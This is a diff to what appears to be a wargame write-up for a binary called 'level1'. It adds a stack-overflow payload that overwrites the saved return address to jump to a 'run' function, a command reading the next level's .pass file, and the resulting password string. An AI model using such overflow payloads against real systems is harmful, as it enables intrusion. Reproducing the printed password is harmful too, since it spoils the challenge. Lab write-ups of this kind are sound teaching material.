@@ -1,3 +1,15 @@
+Execute the *level1* binary:
+
+```bash
+./level1
+abcd
+```
+
+```bash
+```
+
+> Note the *level1* binary read user input from stdin.
+
 ```gdb
 disass main
 ```
@@ -146,8 +158,16 @@ To overwrite the saved eip return address, the input need to have a length of 76
 
 ```bash
 (echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x44\x84\x04\x08" ; cat) | ./level1
+cat /home/user/level2/.pass
+exit
 ```
 
 > "\x44\x84\x04\x08" is the reversed *run* function address (initially 0x __08048444__).
 
 > Use __cat__ to keep stdin open.
+
+```
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+Segmentation fault (core dumped)
+```
